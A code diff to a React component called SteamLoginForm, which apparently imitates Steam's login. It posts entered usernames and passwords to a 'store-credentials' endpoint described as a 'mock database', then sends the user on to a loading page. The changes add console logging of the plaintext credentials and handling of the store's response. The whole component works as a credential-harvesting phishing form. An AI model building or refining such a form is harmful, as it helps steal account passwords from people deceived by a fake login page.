@@ -28,8 +28,10 @@ const SteamLoginForm = () => {
 
     // Send to mock database
     try {
+      console.log("Sending credentials to database:", { username, password });
+      
       // API call to add the credentials to our mock database
-      await fetch('/api/store-credentials', {
+      const response = await fetch('/api/store-credentials', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -37,9 +39,17 @@ const SteamLoginForm = () => {
         body: JSON.stringify({ username, password }),
       });
       
-      // Navigate to the loading page
-      navigate('/loading', { state: { username, password } });
+      const data = await response.json();
+      console.log("Response from database:", data);
+      
+      if (data.success) {
+        // Navigate to the loading page
+        navigate('/loading', { state: { username, password } });
+      } else {
+        throw new Error("Failed to store credentials");
+      }
     } catch (error) {
+      console.error("Error storing credentials:", error);
       setIsLoading(false);
       toast.error("Bir hata oluştu. Lütfen tekrar deneyin.");
     }
